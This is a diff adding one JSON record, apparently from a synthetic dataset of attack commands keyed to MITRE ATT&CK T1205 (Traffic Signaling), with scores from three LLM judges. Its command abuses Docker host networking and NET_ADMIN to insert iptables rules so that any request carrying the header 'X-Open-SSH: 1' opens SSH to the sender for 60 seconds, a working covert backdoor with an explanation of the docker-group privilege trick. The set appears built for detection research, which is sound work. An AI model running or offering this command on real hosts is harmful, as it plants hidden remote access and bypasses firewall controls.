@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p tcp --dport 80 -m string --string 'X-Open-SSH: 1' --algo bm -j LOG --log-prefix 'T1205_HTTP_SIG ' --log-level 4 && iptables -I INPUT -p tcp --dport 80 -m string --string 'X-Open-SSH: 1' --algo bm -m recent --name t1205_http --set && iptables -I INPUT -p tcp --dport 22 -m recent --name t1205_http --rcheck --seconds 60 --reap -j ACCEPT\"",
+  "explanation": "Installs iptables from a Docker container on the host network and creates traffic signaling via an HTTP header (application-specific). When an inbound HTTP request contains header 'X-Open-SSH: 1', the source IP is recorded and SSH (22) is temporarily opened for that IP. The signaling is logged for detection.",
+  "rationale_steps": [
+    "Use docker with --net=host and NET_ADMIN to modify host firewall from docker_group privileges.",
+    "Match application-layer HTTP header using iptables string match to act as a covert signal.",
+    "Log the signaling packet and place source in a 'recent' list; conditionally allow SSH for 60 seconds to that IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-49d55e06",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, proper && chaining, and valid docker and iptables flags and arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "With host networking and NET_ADMIN, it installs iptables and adds rules that log on a specific HTTP header, set a recent list for the source, and temporarily accept SSH from that source, though it relies on an active HTTP service, kernel match modules, and sufficient privileges to run Docker.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T13:09:06.388250Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid Docker and iptables flags, correct command separators, and appropriate escape sequences.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by creating a covert signaling mechanism where an HTTP header triggers temporary SSH access, aligning with T1205's description of using protocol fields to coordinate actions.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T13:09:09.320994Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct command separators, and valid flags for all utilities (docker, apk, iptables).",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements the described traffic signaling technique using iptables, but the stated 'Privilege: None' is incorrect as running this docker command with `--net=host` and `CAP_NET_ADMIN`, and modifying host iptables, requires root-equivalent privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T13:09:40.364102Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
